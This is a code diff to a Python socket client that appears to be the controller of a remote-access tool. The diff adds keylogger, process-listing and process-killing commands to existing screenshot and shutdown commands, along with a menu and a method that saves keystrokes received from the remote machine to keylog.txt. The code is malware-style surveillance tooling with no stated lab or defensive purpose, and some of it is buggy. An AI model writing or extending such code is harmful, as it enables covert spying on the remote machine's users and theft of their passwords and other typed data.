@@ -1,15 +1,19 @@
 import socket
 import os
+import time
 
 # Commands
 CMD_SHUTDOWN = 'shutdown'
 CMD_TAKE_SCREENSHOT = 'screenshot'
+CMD_KEY_LOGGER = 'keylogger'
+CMD_VIEW_PROCESSES = 'view_processes'
+CMD_KILL_PROCESS = 'kill_process'
 
 # BUFFER
 BUFFER_SIZE = 1024
 
 # SCREENSHOT
-SCREENSHOT_PATH = './screenshots/'
+SCREENSHOT_PATH = './tmp/'
 
 
 class Client:
@@ -39,10 +43,29 @@ class Client:
       except ConnectionAbortedError:
           pass
 
+  def run(self):
+    while True:
+      cmd = input('''Enter command: 
+      1: Take screenshot
+      2: View processes
+      3: Kill process
+      4: Shutdown
+      ''')
+      if cmd == '1':
+        self.take_screenshot()
+        self.receive_image()
+      elif cmd == '2':
+        self.view_processes()
+      elif cmd == '3':
+        pid = input('Enter PID: ')
+        self.kill_process(pid)
+      elif cmd == '4':
+        self.shutdown()
+        break
+
   def shutdown(self):
     self.socket.send(CMD_SHUTDOWN.encode())
     print("[SHUTDOWN] Disconnected from server")
-    exit()
 
   def take_screenshot(self):
     self.socket.send(CMD_TAKE_SCREENSHOT.encode())
@@ -54,6 +77,32 @@ class Client:
         if not data:
           break
         f.write(data)
+
+  def key_logger(self):
+    with open(os.path.join(SCREENSHOT_PATH, 'keylog.txt'), 'w') as f:
+      while True:
+        data = self.socket.recv(BUFFER_SIZE)
+        if not data:
+          break
+        f.write(data)
+
+  def view_processes(self):
+    self.socket.send(CMD_VIEW_PROCESSES.encode())
+    processes = ""
+    while True:
+      data = self.socket.recv(BUFFER_SIZE)
+      if data == b'PROCESSES_END':
+        break
+      else:
+        processes = data.decode()
+        
+    print(processes)
+      
+  
+  def kill_process(self, pid):
+    self.socket.send(CMD_KILL_PROCESS.encode())
+    time.sleep(0.01)
+    self.socket.send(str(pid).encode())
     
 
 
